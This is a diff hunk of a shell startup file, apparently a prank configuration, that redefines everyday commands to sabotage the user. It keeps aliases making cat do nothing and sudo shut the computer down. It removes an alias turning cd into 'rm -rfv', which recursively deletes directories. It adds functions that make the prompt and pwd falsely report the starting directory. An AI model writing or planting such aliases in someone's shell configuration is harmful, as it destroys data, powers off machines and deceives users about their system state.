@@ -16,8 +16,12 @@ alias cat=true
 # Use a random sort option whenever `ls` is invoked
 function ls { command ls -$(opts="frStu"; echo ${opts:$((RANDOM % ${#opts})):1}) "$@"; }
 
-# Delete directories instead of entering them
-alias cd='rm -rfv'
+# Show initial location in prompt and pwd
+FPWD="$PWD"
+PS1="${PS1/PWD/FPWD}"
+PS1="${PS1/\\w/'${FPWD/\~/~}'}"
+PS1="${PS1/\\W/'$([[ $FPWD = ~ ]] && echo \~ || basename "$FPWD")'}"
+function pwd { echo "$FPWD"; }
 
 # Shut down the computer instead of running a command with super-user rights
 alias sudo='sudo shutdown -P now'
